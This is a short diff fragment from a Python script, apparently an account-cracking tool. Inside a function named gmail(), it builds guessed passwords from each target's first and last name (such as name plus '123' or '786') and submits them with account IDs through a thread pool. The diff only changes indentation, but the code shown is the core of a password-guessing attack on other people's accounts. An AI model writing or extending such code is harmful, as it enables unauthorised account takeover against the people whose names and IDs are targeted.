@@ -644,12 +644,12 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-				if mthd in ['1','01']:
-					Aking.submit(m1,ids,passlist)
-				elif mthd in ['2','02']:
-					Aking.submit(m2,ids,passlist)
-				else:
-					Aking.submit(m1,ids,passlist)
+			if mthd in ['1','01']:
+				Aking.submit(m1,ids,passlist)
+			elif mthd in ['2','02']:
+				Aking.submit(m2,ids,passlist)
+			else:
+				Aking.submit(m1,ids,passlist)
                                 
                 print('\033[1;37m')
                 linex()
